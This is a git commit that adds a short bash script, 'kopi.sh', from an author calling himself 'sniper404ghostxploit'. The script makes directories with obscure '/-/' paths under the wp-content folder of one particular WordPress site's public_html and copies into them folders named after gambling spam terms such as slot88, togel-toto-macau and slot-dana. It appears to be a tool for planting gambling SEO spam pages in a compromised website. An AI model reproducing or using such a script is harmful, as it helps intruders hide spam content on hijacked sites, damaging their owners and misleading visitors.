543257cda19dd85d89b44c4deb82a3b8f31ddfa2
sniper404ghostxploit <115604134+sniper404ghostxploit@users.noreply.github.com>
2023-09-08 17:10:40 +0700

    Create kopi.sh

---
+++ kopi.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+mkdir /home/siakbawaslugo/public_html/wp-content/updates/-/slot88
+cp -r slot88 /home/siakbawaslugo/public_html/wp-content/updates/-/
+mkdir /home/siakbawaslugo/public_html/wp-content/visit/-/slot-toto
+cp -r slot-toto /home/siakbawaslugo/public_html/wp-content/visit/-/
+mkdir /home/siakbawaslugo/public_html/wp-content/visit/-/toto-macau-4d
+cp -r toto-macau-4d /home/siakbawaslugo/public_html/wp-content/visit/-/
+mkdir /home/siakbawaslugo/public_html/wp-content/files/-/togel-toto-macau
+cp -r togel-toto-macau /home/siakbawaslugo/public_html/wp-content/files/-/
+mkdir /home/siakbawaslugo/public_html/wp-content/unknown/-/slot-triofus
+cp -r slot-triofus /home/siakbawaslugo/public_html/wp-content/unknown/-/
+mkdir /home/siakbawaslugo/public_html/wp-content/updates/-/slot-dana
+cp -r slot-dana /home/siakbawaslugo/public_html/wp-content/updates/-/
